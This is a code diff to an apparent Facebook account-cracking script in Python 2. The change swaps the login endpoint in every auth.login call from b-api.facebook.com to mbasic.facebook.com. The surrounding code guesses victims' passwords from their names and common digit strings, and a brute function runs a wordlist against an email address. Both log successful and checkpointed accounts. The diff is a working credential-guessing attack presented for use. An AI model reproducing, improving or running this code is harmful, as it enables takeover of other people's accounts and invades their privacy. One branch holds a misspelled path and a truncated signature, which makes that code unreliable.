@@ -297,7 +297,7 @@ def pilih_super():
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
 			pass1 = b['first_name'] + b['last_name']
-			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+			data = urllib.urlopen("https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
 				print '\033[0;92m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass1 + '\033[0;39m | \033[0;39m' + b['name']
@@ -311,7 +311,7 @@ def pilih_super():
 					cekpoint.append(user+pass1)
 				else:
 					pass2 = b['first_name'] + '123'
-					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+					data = urllib.urlopen("https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
 						print '\033[0;91m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass2 + '\033[0;39m | \033[0;39m' + b['name']
@@ -325,7 +325,7 @@ def pilih_super():
 							cekpoint.append(user+pass2)
 						else:
 							pass3 = b['first_name'] + '12345'
-							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+							data = urllib.urlopen("https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
 								print '\033[0;92m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass3 + '\033[0;39m | \033[0;39m' + b['name']
@@ -339,7 +339,7 @@ def pilih_super():
 									cekpoint.append(user+pass4)
 								else:
 									pass4 = b['first_name'] + '1234'
-									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+									data = urllib.urlopen("https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
 										print '\033[0;92m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass4 + '\033[0;39m | \033[0;39m' + b['name']
@@ -353,7 +353,7 @@ def pilih_super():
 											cekpoint.append(user+pass4)
 										else:
 											pass5 = '102030'
-											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+											data = urllib.urlopen("https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
 												print '\033[0;92m[OK] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass5 + '\033[0;39m | \033[0;39m' + b['name']
@@ -367,7 +367,7 @@ def pilih_super():
 													cekpoint.append(user+pass5)
 												else:
 													pass6 = '778899'
-													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+													data = urllib.urlopen("https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
 														print '\033[0;92m[OK] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass6 + '\033[0;39m | \033[0;39m' + b['name']
@@ -381,7 +381,7 @@ def pilih_super():
 															cekpoint.append(user+pass6)
 														else:
 															pass7 = '445566'
-															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+															data = urllib.urlopen("https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
 																print '\033[0;92m[OK] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass7 + '\033[0;39m | \033[0;39m' + b['name']
@@ -395,7 +395,7 @@ def pilih_super():
 																	cekpoint.append(user+pass7)
 																else:
 																	pass8 = '223344'
-																	data = urllib.urlopen("https://b-api.facebook.com/methode/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f522ef6")
+																	data = urllib.urlopen("https://mbasic.facebook.com/methode/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f522ef6")
 																	q = json.load(data)
 																	if 'access_token' in q:
 																		print '\033[0;92m[OK] \033[0;39m '+ user + ' \x1b[0;36;39|\033[0;39m ' + pass8 + '\033[0;39m | \033[0;39m' + b['name']
@@ -450,7 +450,7 @@ def brute():
                     pw = pw.replace('\n', '')
                     sys.stdout.write('\r\033[0;39m[\033[0;39m\xe2\x9c\xb8\033[0;39m] \033[0;39mTry \033[0;39m' + pw)
                     sys.stdout.flush()
-                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    data = requests.get('https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     mpsh = json.loads(data.text)
                     if 'access_token' in mpsh:
                         dapat = open('Brute.txt', 'w')
